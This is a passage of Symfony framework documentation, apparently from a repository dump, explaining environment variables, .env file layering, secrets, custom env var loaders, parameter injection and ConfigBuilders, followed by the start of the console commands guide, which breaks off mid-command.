can\ndefine a ``staging`` environment where the client can test the project before\ngoing to production:\n\n#. Create a configuration directory with the same name as the environment (in\n   this case, ``config/packages/staging/``);\n#. Add the needed configuration files in ``config/packages/staging/`` to\n   define the behavior of the new environment. Symfony loads the\n   ``config/packages/*.yaml`` files first, so you only need to configure the\n   differences to those files;\n#. Select the ``staging`` environment using the ``APP_ENV`` env var as explained\n   in the previous section.\n\n.. tip::\n\n    It's common for environments to be similar to each other, so you can\n    use `symbolic links`_ between ``config/packages/<environment-name>/``\n    directories to reuse the same configuration.\n\nInstead of creating new environments, you can use environment variables as\nexplained in the following section. This way you can use the same application\nand environment (e.g. ``prod``) but change its behavior thanks to the\nconfiguration based on environment variables (e.g. to run the application in\ndifferent scenarios: staging, quality assurance, client review, etc.)\n\n.. _config-env-vars:\n\nConfiguration Based on Environment Variables\n--------------------------------------------\n\nUsing `environment variables`_ (or \"env vars\" for short) is a common practice to:\n\n* Configure options that depend on where the application is run (e.g. the database\n  credentials are usually different in production versus your local machine);\n* Configure options that can change dynamically in a production environment (e.g.\n  to update the value of an expired API key without having to redeploy the entire\n  application).\n\nIn other cases, it's recommended to keep using :ref:`configuration parameters <configuration-parameters>`.\n\nUse the special syntax ``%env(ENV_VAR_NAME)%`` to reference environment variables.\nThe values of these options are resolved at runtime (only once per request, to\nnot impact performance) so you can change the application behavior without having\nto clear the cache.\n\nThis example shows how you could configure the application secret using an env var:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            # by convention the env var names are always uppercase\n            secret: '%env(APP_SECRET)%'\n            # ...\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/framework\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- by convention the env var names are always uppercase -->\n            <framework:config secret=\"%env(APP_SECRET)%\"/>\n\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        return static function (ContainerConfigurator $container): void {\n            $container->extension('framework', [\n                // by convention the env var names are always uppercase\n                'secret' => '%env(APP_SECRET)%',\n            ]);\n        };\n\n.. note::\n\n    Your env vars can also be accessed via the PHP super globals ``$_ENV`` and\n    ``$_SERVER`` (both are equivalent)::\n\n        $databaseUrl = $_ENV['DATABASE_URL']; // mysql://db_user:db_password@127.0.0.1:3306/db_name\n        $env = $_SERVER['APP_ENV']; // prod\n\n    However, in Symfony applications there's no need to use this, because the\n    configuration system provides a better way of working with env vars.\n\n.. seealso::\n\n    The values of env vars can only be strings, but Symfony includes some\n    :doc:`env var processors </configuration/env_var_processors>` to transform\n    their contents (e.g. to turn a string value into an integer).\n\nTo define the value of an env var, you have several options:\n\n* :ref:`Add the value to a .env file <config-dot-env>`;\n* :ref:`Encrypt the value as a secret <configuration-secrets>`;\n* Set the value as a real environment variable in your shell or your web server.\n\nIf your application tries to use an env var that hasn't been defined, you'll see\nan exception. You can prevent that by defining a default value for the env var.\nTo do so, define a parameter with the same name as the env var using this syntax:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        parameters:\n            # if the SECRET env var value is not defined anywhere, Symfony uses this value\n            env(SECRET): 'some_secret'\n\n        # ...\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <parameters>\n                <!-- if the SECRET env var value is not defined anywhere, Symfony uses this value -->\n                <parameter key=\"env(SECRET)\">some_secret</parameter>\n            </parameters>\n\n            <!-- ... -->\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Symfony\\Component\\DependencyInjection\\ContainerBuilder;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (ContainerBuilder $container, FrameworkConfig $framework) {\n            // if the SECRET env var value is not defined anywhere, Symfony uses this value\n            $container->setParameter('env(SECRET)', 'some_secret');\n\n            // ...\n        };\n\n.. tip::\n\n    Some hosts - like Platform.sh - offer easy `utilities to manage env vars`_\n    in production.\n\n.. note::\n\n    Some configuration features are not compatible with env vars. For example,\n    defining some container parameters conditionally based on the existence of\n    another configuration option. When using an env var, the configuration option\n    always exists, because its value will be ``null`` when the related env var\n    is not defined.\n\n.. danger::\n\n    Beware that dumping the contents of the ``$_SERVER`` and ``$_ENV`` variables\n    or outputting the ``phpinfo()`` contents will display the values of the\n    environment variables, exposing sensitive information such as the database\n    credentials.\n\n    The values of the env vars are also exposed in the web interface of the\n    :doc:`Symfony profiler </profiler>`. In practice this shouldn't be a\n    problem because the web profiler must **never** be enabled in production.\n\n.. _configuration-env-var-in-dev:\n.. _config-dot-env:\n\nConfiguring Environment Variables in .env Files\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of defining env vars in your shell or your web server, Symfony provides\na convenient way to define them inside a ``.env`` (with a leading dot) file\nlocated at the root of your project.\n\nThe ``.env`` file is read and parsed on every request and its env vars are added\nto the ``$_ENV`` & ``$_SERVER`` PHP variables. Any existing env vars are *never*\noverwritten by the values defined in ``.env``, so you can combine both.\n\nFor example, to define the ``DATABASE_URL`` env var shown earlier in this article,\nyou can add:\n\n.. code-block:: bash\n\n    # .env\n    DATABASE_URL=\"mysql://db_user:db_password@127.0.0.1:3306/db_name\"\n\nThis file should be committed to your repository and (due to that fact) should\nonly contain \"default\" values that are good for local development. This file\nshould not contain production values.\n\nIn addition to your own env vars, this ``.env`` file also contains the env vars\ndefined by the third-party packages installed in your application (they are\nadded automatically by :ref:`Symfony Flex <symfony-flex>` when installing packages).\n\n.. tip::\n\n    Since the ``.env`` file is read and parsed on every request, you don't need to\n    clear the Symfony cache or restart the PHP container if you're using Docker.\n\n.env File Syntax\n................\n\nAdd comments by prefixing them with ``#``:\n\n.. code-block:: bash\n\n    # database credentials\n    DB_USER=root\n    DB_PASS=pass # this is the secret password\n\nUse environment variables in values by prefixing variables with ``$``:\n\n.. code-block:: bash\n\n    DB_USER=root\n    DB_PASS=${DB_USER}pass # include the user as a password prefix\n\n.. warning::\n\n    The order is important when some env var depends on the value of other env\n    vars. In the above example, ``DB_PASS`` must be defined after ``DB_USER``.\n    Moreover, if you define multiple ``.env`` files and put ``DB_PASS`` first,\n    its value will depend on the ``DB_USER`` value defined in other files\n    instead of the value defined in this file.\n\nDefine a default value in case the environment variable is not set:\n\n.. code-block:: bash\n\n    DB_USER=\n    DB_PASS=${DB_USER:-root}pass # results in DB_PASS=rootpass\n\nEmbed commands via ``$()`` (not supported on Windows):\n\n.. code-block:: bash\n\n    START_TIME=$(date)\n\n.. warning::\n\n    Using ``$()`` might not work depending on your shell.\n\n.. tip::\n\n    As a ``.env`` file is a regular shell script, you can ``source`` it in\n    your own shell scripts:\n\n    .. code-block:: terminal\n\n        $ source .env\n\n.. _configuration-multiple-env-files:\n\nOverriding Environment Values via .env.local\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you need to override an environment value (e.g. to a different value on your\nlocal machine), you can do that in a ``.env.local`` file:\n\n.. code-block:: bash\n\n    # .env.local\n    DATABASE_URL=\"mysql://root:@127.0.0.1:3306/my_database_name\"\n\nThis file should be ignored by git and should *not* be committed to your repository.\nSeveral other ``.env`` files are available to set environment variables in *just*\nthe right situation:\n\n* ``.env``: defines the default values of the env vars needed by the application;\n* ``.env.local``: overrides the default values for all environments but only on\n  the machine which contains the file. This file should not be committed to the\n  repository and it's ignored in the ``test`` environment (because tests should\n  produce the same results for everyone);\n* ``.env.<environment>`` (e.g. ``.env.test``): overrides env vars only for one\n  environment but for all machines (these files *are* committed);\n* ``.env.<environment>.local`` (e.g. ``.env.test.local``): defines machine-specific\n  env var overrides only for one environment. It's similar to ``.env.local``,\n  but the overrides only apply to one environment.\n\n*Real* environment variables always win over env vars created by any of the\n``.env`` files. Note that this behavior depends on the\n`variables_order <http://php.net/manual/en/ini.core.php#ini.variables-order>`_\nconfiguration, which must contain an ``E`` to expose the ``$_ENV`` superglobal.\nThis is the default configuration in PHP.\n\nThe ``.env`` and ``.env.<environment>`` files should be committed to the\nrepository because they are the same for all developers and machines. However,\nthe env files ending in ``.local`` (``.env.local`` and ``.env.<environment>.local``)\n**should not be committed** because only you will use them. In fact, the\n``.gitignore`` file that comes with Symfony prevents them from being committed.\n\nOverriding Environment Variables Defined By The System\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you need to override an environment variable defined by the system, use the\n``overrideExistingVars`` parameter defined by the\n:method:`Symfony\\\\Component\\\\Dotenv\\\\Dotenv::loadEnv`,\n:method:`Symfony\\\\Component\\\\Dotenv\\\\Dotenv::bootEnv`, and\n:method:`Symfony\\\\Component\\\\Dotenv\\\\Dotenv::populate` methods::\n\n    use Symfony\\Component\\Dotenv\\Dotenv;\n\n    $dotenv = new Dotenv();\n    $dotenv->loadEnv(__DIR__.'/.env', overrideExistingVars: true);\n\n    // ...\n\nThis will override environment variables defined by the system but it **won't**\noverride environment variables defined in ``.env`` files.\n\n.. _configuration-env-var-in-prod:\n\nConfiguring Environment Variables in Production\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn production, the ``.env`` files are also parsed and loaded on each request. So\nthe easiest way to define env vars is by creating a ``.env.local`` file on your\nproduction server(s) with your production values.\n\nTo improve performance, you can optionally run the ``dump-env`` Composer command:\n\n.. code-block:: terminal\n\n    # parses ALL .env files and dumps their final values to .env.local.php\n    $ composer dump-env prod\n\n.. sidebar:: Dumping Environment Variables without Composer\n\n    If you don't have Composer installed in production, you can use the\n    ``dotenv:dump`` command instead (available in :ref:`Symfony Flex <symfony-flex>`\n    1.2 or later). The command is not registered by default, so you must register\n    first in your services:\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            Symfony\\Component\\Dotenv\\Command\\DotenvDumpCommand: ~\n\n    Then, run the command:\n\n    .. code-block:: terminal\n\n        # parses ALL .env files and dumps their final values to .env.local.php\n        $ APP_ENV=prod APP_DEBUG=0 php bin/console dotenv:dump\n\nAfter running this command, Symfony will load the ``.env.local.php`` file to\nget the environment variables and will not spend time parsing the ``.env`` files.\n\n.. tip::\n\n    Update your deployment tools/workflow to run the ``dotenv:dump`` command after\n    each deploy to improve the application performance.\n\nStoring Environment Variables In Other Files\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBy default, the environment variables are stored in the ``.env`` file located\nat the root of your project. However, you can store them in other files in\nmultiple ways.\n\nIf you use the :doc:`Runtime component </components/runtime>`, the dotenv\npath is part of the options you can set in your ``composer.json`` file:\n\n.. code-block:: json\n\n      {\n          // ...\n          \"extra\": {\n              // ...\n              \"runtime\": {\n                  \"dotenv_path\": \"my/custom/path/to/.env\"\n              }\n          }\n      }\n\nAs an alternate option, you can directly invoke the ``Dotenv`` class in your\n``bootstrap.php`` file or any other file of your application::\n\n    use Symfony\\Component\\Dotenv\\Dotenv;\n\n    (new Dotenv())->bootEnv(dirname(__DIR__).'my/custom/path/to/.env');\n\nSymfony will then look for the environment variables in that file, but also in\nthe local and environment-specific files (e.g. ``.*.local`` and\n``.*.<environment>.local``). Read\n:ref:`how to override environment variables <configuration-multiple-env-files>`\nto learn more about this.\n\nIf you need to know the path to the ``.env`` file that Symfony is using, you can\nread the ``SYMFONY_DOTENV_PATH`` environment variable in your application.\n\n.. versionadded:: 7.1\n\n    The ``SYMFONY_DOTENV_PATH`` environment variable was introduced in Symfony\n    7.1.\n\n.. _configuration-secrets:\n\nEncrypting Environment Variables (Secrets)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of defining a real environment variable or adding it to a ``.env`` file,\nif the value of a variable is sensitive (e.g. an API key or a database password),\nyou can encrypt the value using the :doc:`secrets management system </configuration/secrets>`.\n\nListing Environment Variables\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUse the ``debug:dotenv`` command to understand how Symfony parses the different\n``.env`` files to set the value of each environment variable:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:dotenv\n\n    Dotenv Variables & Files\n    ========================\n\n    Scanned Files (in descending priority)\n    --------------------------------------\n\n    * ⨯ .env.local.php\n    * ⨯ .env.dev.local\n    * ✓ .env.dev\n    * ⨯ .env.local\n    * ✓ .env\n\n    Variables\n    ---------\n\n    ---------- ------- ---------- ------\n     Variable   Value   .env.dev   .env\n    ---------- ------- ---------- ------\n     FOO        BAR     n/a        BAR\n     ALICE      BOB     BOB        bob\n    ---------- ------- ---------- ------\n\n    # look for a specific variable passing its full or partial name as an argument\n    $ php bin/console debug:dotenv foo\n\nAdditionally, and regardless of how you set environment variables, you can see all\nenvironment variables, with their values, referenced in Symfony's container configuration,\nyou can also see the number of occurrences of each environment variable in the container:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:container --env-vars\n\n    ------------ ----------------- ------------------------------------ -------------\n     Name         Default value     Real value                           Usage count\n    ------------ ----------------- ------------------------------------ -------------\n     APP_SECRET   n/a               \"471a62e2d601a8952deb186e44186cb3\"   2\n     BAR          n/a               n/a                                  1\n     BAZ          n/a               \"value\"                              0\n     FOO          \"[1, \"2.5\", 3]\"   n/a                                  1\n    ------------ ----------------- ------------------------------------ -------------\n\n    # you can also filter the list of env vars by name:\n    $ php bin/console debug:container --env-vars foo\n\n    # run this command to show all the details for a specific env var:\n    $ php bin/console debug:container --env-var=FOO\n\nCreating Your Own Logic To Load Env Vars\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can implement your own logic to load environment variables if the default\nSymfony behavior doesn't fit your needs. To do so, create a service whose class\nimplements :class:`Symfony\\\\Component\\\\DependencyInjection\\\\EnvVarLoaderInterface`.\n\n.. note::\n\n    If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,\n    the autoconfiguration feature will enable and tag this service automatically.\n    Otherwise, you need to register and :doc:`tag your service </service_container/tags>`\n    with the ``container.env_var_loader`` tag.\n\nLet's say you have a JSON file named ``env.json`` containing your environment\nvariables:\n\n.. code-block:: json\n\n    {\n        \"vars\": {\n            \"APP_ENV\": \"prod\",\n            \"APP_DEBUG\": false\n        }\n    }\n\nYou can define a class like the following ``JsonEnvVarLoader`` to populate the\nenvironment variables from the file::\n\n    namespace App\\DependencyInjection;\n\n    use Symfony\\Component\\DependencyInjection\\EnvVarLoaderInterface;\n\n    final class JsonEnvVarLoader implements EnvVarLoaderInterface\n    {\n        private const ENV_VARS_FILE = 'env.json';\n\n        public function loadEnvVars(): array\n        {\n            $fileName = __DIR__.\\DIRECTORY_SEPARATOR.self::ENV_VARS_FILE;\n            if (!is_file($fileName)) {\n                // throw an exception or just ignore this loader, depending on your needs\n            }\n\n            $content = json_decode(file_get_contents($fileName), true);\n\n            return $content['vars'];\n        }\n    }\n\nThat's it! Now the application will look for a ``env.json`` file in the\ncurrent directory to populate environment variables (in addition to the\nalready existing ``.env`` files).\n\n.. tip::\n\n    If you want an env var to have a value on a certain environment but to fallback\n    on loaders on another environment, assign an empty value to the env var for\n    the environment you want to use loaders:\n\n    .. code-block:: bash\n\n        # .env (or .env.local)\n        APP_ENV=prod\n\n        # .env.prod (or .env.prod.local) - this will fallback on the loaders you defined\n        APP_ENV=\n\n.. _configuration-accessing-parameters:\n\nAccessing Configuration Parameters\n----------------------------------\n\nControllers and services can access all the configuration parameters. This\nincludes both the :ref:`parameters defined by yourself <configuration-parameters>`\nand the parameters created by packages/bundles. Run the following command to see\nall the parameters that exist in your application:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:container --parameters\n\nIn controllers extending from the :ref:`AbstractController <the-base-controller-class-services>`,\nuse the ``getParameter()`` helper::\n\n    // src/Controller/UserController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class UserController extends AbstractController\n    {\n        // ...\n\n        public function index(): Response\n        {\n            $projectDir = $this->getParameter('kernel.project_dir');\n            $adminEmail = $this->getParameter('app.admin_email');\n\n            // ...\n        }\n    }\n\nIn services and controllers not extending from ``AbstractController``, inject\nthe parameters as arguments of their constructors. You must inject them\nexplicitly because :doc:`service autowiring </service_container/autowiring>`\ndoesn't work for parameters:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        parameters:\n            app.contents_dir: '...'\n\n        services:\n            App\\Service\\MessageGenerator:\n                arguments:\n                    $contentsDir: '%app.contents_dir%'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <parameters>\n                <parameter key=\"app.contents_dir\">...</parameter>\n            </parameters>\n\n            <services>\n                <service id=\"App\\Service\\MessageGenerator\">\n                    <argument key=\"$contentsDir\">%app.contents_dir%</argument>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\MessageGenerator;\n\n        return static function (ContainerConfigurator $container): void {\n            $container->parameters()\n                ->set('app.contents_dir', '...');\n\n            $container->services()\n                ->get(MessageGenerator::class)\n                    ->arg('$contentsDir', '%app.contents_dir%');\n        };\n\nIf you inject the same parameters over and over again, use the\n``services._defaults.bind`` option instead. The arguments defined in that option are\ninjected automatically whenever a service constructor or controller action\ndefines an argument with that exact name. For example, to inject the value of the\n:ref:`kernel.project_dir parameter <configuration-kernel-project-directory>`\nwhenever a service/controller defines a ``$projectDir`` argument, use this:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            _defaults:\n                bind:\n                    # pass this value to any $projectDir argument for any service\n                    # that's created in this file (including controller arguments)\n                    $projectDir: '%kernel.project_dir%'\n\n            # ...\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <defaults autowire=\"true\" autoconfigure=\"true\" public=\"false\">\n                    <!-- pass this value to any $projectDir argument for any service\n                         that's created in this file (including controller arguments) -->\n                    <bind key=\"$projectDir\">%kernel.project_dir%</bind>\n                </defaults>\n\n                <!-- ... -->\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        return static function (ContainerConfigurator $container): void {\n            $container->services()\n                ->defaults()\n                    // pass this value to any $projectDir argument for any service\n                    // that's created in this file (including controller arguments)\n                    ->bind('$projectDir', '%kernel.project_dir%');\n\n            // ...\n        };\n\n.. seealso::\n\n    Read the article about :ref:`binding arguments by name and/or type <services-binding>`\n    to learn more about this powerful feature.\n\nFinally, if some service needs access to lots of parameters, instead of\ninjecting each of them individually, you can inject all the application\nparameters at once by type-hinting any of its constructor arguments with the\n:class:`Symfony\\\\Component\\\\DependencyInjection\\\\ParameterBag\\\\ContainerBagInterface`::\n\n    // src/Service/MessageGenerator.php\n    namespace App\\Service;\n\n    // ...\n\n    use Symfony\\Component\\DependencyInjection\\ParameterBag\\ContainerBagInterface;\n\n    class MessageGenerator\n    {\n        public function __construct(\n            private ContainerBagInterface $params,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            // get any container parameter from $this->params, which stores all of them\n            $sender = $this->params->get('mailer_sender');\n            // ...\n        }\n    }\n\n.. _config-config-builder:\n\nUsing PHP ConfigBuilders\n------------------------\n\nWriting PHP config is sometimes difficult because you end up with large nested\narrays and you have no autocompletion help from your favorite IDE. A way to\naddress this is to use \"ConfigBuilders\". They are objects that will help you\nbuild these arrays.\n\nSymfony generates the ConfigBuilder classes automatically in the\n:ref:`kernel build directory <configuration-kernel-build-directory>` for all the\nbundles installed in your application. By convention they all live in the\nnamespace ``Symfony\\Config``::\n\n    // config/packages/security.php\n    use Symfony\\Config\\SecurityConfig;\n\n    return static function (SecurityConfig $security): void {\n        $security->firewall('main')\n            ->pattern('^/*')\n            ->lazy(true)\n            ->security(false);\n\n        $security\n            ->roleHierarchy('ROLE_ADMIN', ['ROLE_USER'])\n            ->roleHierarchy('ROLE_SUPER_ADMIN', ['ROLE_ADMIN', 'ROLE_ALLOWED_TO_SWITCH'])\n            ->accessControl()\n                ->path('^/user')\n                ->roles('ROLE_USER');\n\n        $security->accessControl(['path' => '^/admin', 'roles' => 'ROLE_ADMIN']);\n    };\n\n.. note::\n\n    Only root classes in the namespace ``Symfony\\Config`` are ConfigBuilders.\n    Nested configs (e.g. ``\\Symfony\\Config\\Framework\\CacheConfig``) are regular\n    PHP objects which aren't autowired when using them as an argument type.\n\n.. note::\n\n    In order to get ConfigBuilders autocompletion in your IDE/editor, make sure\n    to not exclude the directory where these classes are generated (by default,\n    in ``var/cache/dev/Symfony/Config/``).\n\nKeep Going!\n-----------\n\nCongratulations! You've tackled the basics of Symfony. Next, learn about *each*\npart of Symfony individually by following the guides. Check out:\n\n* :doc:`/forms`\n* :doc:`/doctrine`\n* :doc:`/service_container`\n* :doc:`/security`\n* :doc:`/mailer`\n* :doc:`/logging`\n\nAnd all the other topics related to configuration:\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    configuration/*\n\n.. _`Learn the XML syntax`: https://en.wikipedia.org/wiki/XML\n.. _`environment variables`: https://en.wikipedia.org/wiki/Environment_variable\n.. _`symbolic links`: https://en.wikipedia.org/wiki/Symbolic_link\n.. _`utilities to manage env vars`: https://symfony.com/doc/current/cloud/env.html\n"
        },
        {
          "name": "configuration",
          "type": "tree",
          "content": null
        },
        {
          "name": "console.rst",
          "type": "blob",
          "size": 22.0849609375,
          "content": "Console Commands\n================\n\nThe Symfony framework provides lots of commands through the ``bin/console`` script\n(e.g. the well-known ``bin/console cache:clear`` command). These commands are\ncreated with the :doc:`Console component </components/console>`. You can also\nuse it to create your own commands.\n\nRunning Commands\n----------------\n\nEach Symfony application comes with a large set of commands. You can use\nthe ``list`` command to view all available commands in the application:\n\n.. code-block:: terminal\n\n    $ php bin/console list\n    ...\n\n    Available commands:\n      about                                      Display information about the current project\n      completion                                 Dump the shell completion script\n      help                                       Display help for a command\n      list                                       List commands\n     assets\n      assets:install                             Install bundle's web assets under a public directory\n     cache\n      cache:clear                                Clear the cache\n    ...\n\n.. note::\n\n    ``list`` is the default command, so running ``php bin/console`` is the same.\n\nIf you find the command you need, you can run it with the ``--help`` option\nto view the command's documentation:\n\n.. code-block:: terminal\n\n    $ php bin/console assets:install --help\n\n.. note::\n\n    ``--help`` is one of the built-in global options from the Console component,\n    which are available for all commands, including those you can create.\n    To learn more about them, you can read\n    :ref:`this section <console-global-options>`.\n\nAPP_ENV & APP_DEBUG\n~~~~~~~~~~~~~~~~~~~\n\nConsole commands run in the :ref:`environment <config-dot-env>` defined in the ``APP_ENV``\nvariable of the ``.env`` file, which is ``dev`` by default. It also reads the ``APP_DEBUG``\nvalue to turn \"debug\" mode on or off (it defaults to ``1``, which is on).\n\nTo run the command in another environment or debug mode, edit the value of ``APP_ENV``\nand ``APP_DEBUG``. You can also define this env vars when running the\ncommand, for instance:\n\n.. code-block:: terminal\n\n    # clears the cache for the prod environment\n    $ APP_ENV=prod php bin/console cache:clear\n\n.. _console-completion-setup:\n\nConsole Completion\n~~~~~~~~~~~~~~~~~~\n\nIf you are using the Bash, Zsh or Fish shell, you can install Symfony's\ncompletion script to get auto completion when typing commands in the\nterminal. All commands support name and option completion, and some can\neven complete values.\n\n.. image:: /_images/components/console/completion.gif\n    :alt: The terminal completes the command name \"secrets:remove\" and the argument \"SOME_OTHER_SECRET\".\n\nFirst, you have to install the completion script *once*. Run\n``bin/console completion --help`` for the installation instructions for\nyour shell.\n\n.. note::\n\n    When using Bash, make sure you installed and setup the \"bash completion\"\n    package for your OS (typically named ``bash-completion``).\n\nAfter installing and restarting your terminal, you're all set to use\ncompletion (by default, by pressing the Tab key).\n\n.. tip::\n\n    Many PHP tools are built using the Symfony Console component (e.g.\n    Composer, PHPstan and Behat). If they are using version 5.4 or higher,\n    you can also install their completion script to enable console completion:\n\n    .. code-block:: terminal\n\n        $ php vendor/bin/phpstan completion --help\n        $ composer completion --help\n\n.. tip::\n\n    If you are using the :doc:`Symfony local web server\n    </setup/symfony_server>`, it is recommended to use the built-in completion\n    script that will ensure the right PHP version and configuration are used when\n    running the Console Completion. Run ``symfony completion --help`` for the\n    installation instructions for your shell. The Symfony CLI will provide\n    completion for the ``console`` and ``composer`` commands.\n\nCreating a Command\n------------------\n\nCommands are defined in classes extending\n:class:`Symfony\\\\Component\\\\Console\\\\Command\\\\Command`. For example, you may\nwant a command to create a user::\n\n    // src/Command/CreateUserCommand.php\n    namespace App\\Command;\n\n    use Symfony\\Component\\Console\\Attribute\\AsCommand;\n    use Symfony\\Component\\Console\\Command\\Command;\n    use Symfony\\Component\\Console\\Input\\InputInterface;\n    use Symfony\\Component\\Console\\Output\\OutputInterface;\n\n    // the name of the command is what users type after \"php bin/console\"\n    #[AsCommand(name: 'app:create-user')]\n    class CreateUserCommand extends Command\n    {\n        protected function execute(InputInterface $input, OutputInterface $output): int\n        {\n            // ... put here the code to create the user\n\n            // this method must return an integer number with the \"exit status code\"\n            // of the command. You can also use these constants to make code more readable\n\n            // return this if there was no problem running the command\n            // (it's equivalent to returning int(0))\n            return Command::SUCCESS;\n\n            // or return this if some error happened during the execution\n            // (it's equivalent to returning int(1))\n            // return Command::FAILURE;\n\n            // or return this to indicate incorrect command usage; e.g. invalid options\n            // or missing arguments (it's equivalent to returning int(2))\n            // return Command::INVALID\n        }\n    }\n\nConfiguring the Command\n~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can optionally define a description, help message and the\n:doc:`input options and arguments </console/input>` by overriding the\n``configure()`` method::\n\n    // src/Command/CreateUserCommand.php\n\n    // ...\n    class CreateUserCommand extends Command\n    {\n        // ...\n        protected function configure(): void\n        {\n            $this\n                // the command description shown when running \"php bin/console list\"\n                ->setDescription('Creates a new user.')\n                // the command help shown when running the command with the \"--help\" option\n                ->setHelp('This command allows you to create a user...')\n            ;\n        }\n    }\n\n.. tip::\n\n    Using the ``#[AsCommand]`` attribute to define a description instead of\n    using the ``setDescription()`` method allows to get the command description without\n    instantiating its class. This makes the ``php bin/console list`` command run\n    much faster.\n\n    If you want to always run the ``list`` command fast, add the ``--short`` option\n    to it (``php bin/console list --short``). This will avoid instantiating command\n    classes, but it won't show any description for commands that use the\n    ``setDescription()`` method instead of the attribute to define the command\n    description.\n\nThe ``configure()`` method is called automatically at the end of the command\nconstructor. If your command defines its own constructor, set the properties\nfirst and then call to the parent constructor, to make those properties\navailable in the ``configure()`` method::\n\n    // ...\n    use Symfony\\Component\\Console\\Command\\Command;\n    use Symfony\\Component\\Console\\Input\\InputArgument;\n\n    class CreateUserCommand extends Command\n    {\n        // ...\n\n        public function __construct(bool $requirePassword = false)\n        {\n            // best practices recommend to call the parent constructor first and\n            // then set your own properties. That wouldn't work in this case\n            // because configure() needs the properties set in this constructor\n            $this->requirePassword = $requirePassword;\n\n            parent::__construct();\n        }\n\n        protected function configure(): void\n        {\n            $this\n                // ...\n                ->addArgument('password', $this->requirePassword ? InputArgument::REQUIRED : InputArgument::OPTIONAL, 'User password')\n            ;\n        }\n    }\n\n.. _console_registering-the-command:\n\nRegistering the Command\n~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can register the command by adding the ``AsCommand`` attribute to it::\n\n    // src/Command/CreateUserCommand.php\n    namespace App\\Command;\n\n    use Symfony\\Component\\Console\\Attribute\\AsCommand;\n    use Symfony\\Component\\Console\\Command\\Command;\n\n    #[AsCommand(\n        name: 'app:create-user',\n        description: 'Creates a new user.',\n        hidden: false,\n        aliases: ['app:add-user']\n    )]\n    class CreateUserCommand extends Command\n    {\n        // ...\n    }\n\nIf you can't use PHP attributes, register the command as a service and\n:doc:`tag it </service_container/tags>` with the ``console.command`` tag. If you're using the\n:ref:`default services.yaml configuration <service-container-services-load-example>`,\nthis is already done for you, thanks to :ref:`autoconfiguration <services-autoconfigure>`.\n\nRunning the Command\n~~~~~~~~~~~~~~~~~~~\n\nAfter configuring and registering the command, you can run it in the terminal:\n\n.. code-block:: terminal\n\n    $ php bin/console 